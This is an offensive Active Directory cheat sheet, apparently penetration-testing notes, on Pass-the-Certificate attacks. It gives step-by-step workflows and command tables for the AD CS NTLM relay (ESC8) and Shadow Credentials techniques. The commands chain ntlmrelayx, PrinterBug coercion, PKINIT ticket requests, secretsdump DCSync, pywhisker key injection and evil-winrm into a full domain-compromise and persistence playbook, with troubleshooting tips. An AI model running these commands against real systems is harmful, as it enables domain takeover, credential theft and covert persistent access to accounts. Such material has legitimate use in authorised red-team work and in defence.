### Pass the Certificate

**Pass-the-Certificate** leverages X.509 certificates to obtain Kerberos Ticket Granting Tickets (TGTs) via the **PKINIT** extension. This technique is a primary component of attacks against **Active Directory Certificate Services (AD CS)** and **Shadow Credentials**.

---

### AD CS NTLM Relay (ESC8)

**Scenario:** Use when a Certificate Authority (CA) is configured with **HTTP Web Enrollment** (default at `/CertSrv`). This allows an attacker to relay captured NTLM authentication to the CA to request a certificate on behalf of the victim.

#### Operational Workflow

1. **Set up Relay Listener:** Start `ntlmrelayx` to intercept authentication and relay it to the AD CS web enrollment endpoint.
2. **Coerce Authentication:** Use a method like the **Printer Bug** to force the target machine account to authenticate to the attacker's listener.
3. **Generate Certificate:** The relay tool automatically requests a certificate from the CA using the relayed credentials and saves it as a `.pfx` file.
4. **Request TGT:** Use the generated certificate to request a TGT via PKINIT.
5. **Post-Exploitation:** Use the obtained TGT to perform actions like **DCSync** if a Domain Controller account was targeted.

#### Command Reference

|Tool|Action|Command|
|:--|:--|:--|
|**Impacket**|Relay NTLM to AD CS|`impacket-ntlmrelayx -t http://<TARGET_IP>/certsrv/certfnsh.asp --adcs -smb2support --template <TEMPLATE_NAME>`|
|**PrinterBug**|Coerce auth from DC|`python3 printerbug.py <DOMAIN>/<USERNAME>:"<PASSWORD>"@<TARGET_IP> <ATTACK_IP>`|
|**PKINITtools**|Obtain TGT from PFX|`python3 gettgtpkinit.py -cert-pfx <CERT_FILE>.pfx -dc-ip <TARGET_IP> '<DOMAIN>/<TARGET_NAME>' <OUTPUT_CCACHE_PATH>`|
|**Impacket**|DCSync with TGT|`export KRB5CCNAME=<CCACHE_PATH> && impacket-secretsdump -k -no-pass -dc-ip <TARGET_IP> -just-dc-user <TARGET_USER> '<DOMAIN>/<ACCOUNT_NAME>'@<TARGET_HOSTNAME>`|

**Note:** The `--template` value for `ntlmrelayx` is typically `KerberosAuthentication` for Domain Controllers but may vary; use `certipy` for enumeration.

---

### Shadow Credentials

**Scenario:** Use when an attacker has **Write permissions** over a victim's `msDS-KeyCredentialLink` attribute (identified by the `AddKeyCredentialLink` edge in BloodHound).

#### Operational Workflow

1. **Inject Public Key:** Use `pywhisker` to generate a certificate and write the corresponding public key to the victim's `msDS-KeyCredentialLink` attribute.
2. **Request TGT:** Use the generated `.pfx` certificate and the password provided by `pywhisker` to acquire a TGT for the victim.
3. **Lateral Movement:** Pass the ticket to access resources, such as connecting via **Evil-WinRM** if the user is in the Remote Management Users group.

#### Command Reference

|Tool|Action|Command|
|:--|:--|:--|
|**pywhisker**|Add Shadow Credential|`pywhisker --dc-ip <TARGET_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --target <TARGET_USER> --action add`|
|**PKINITtools**|Request TGT|`python3 gettgtpkinit.py -cert-pfx <CERT_FILE>.pfx -pfx-pass '<CERT_PASSWORD>' -dc-ip <TARGET_IP> <DOMAIN>/<TARGET_USER> <OUTPUT_CCACHE_PATH>`|
|**Evil-WinRM**|Connect via Kerberos|`export KRB5CCNAME=<CCACHE_PATH> && evil-winrm -i <TARGET_HOSTNAME> -r <DOMAIN>`|

---

### Troubleshooting & Edge Cases

|Condition|Action/Implication|
|:--|:--|
|**KDC lacks PKINIT support**|If a certificate is obtained but pre-authentication fails because the KDC doesn't support the required EKU, use **PassTheCert** to authenticate via **LDAPS** instead.|
|**libcrypto Error**|If `gettgtpkinit.py` fails with "Error detecting the version of libcrypto," install the `oscrypto` library.|

**Attack Implications:**

- Successfully relaying a Domain Controller's authentication via **ESC8** provides a certificate that allows for a **DCSync** attack, effectively compromising the entire domain.
- **Shadow Credentials** allow for persistent take-over of a user or computer account without changing their actual password.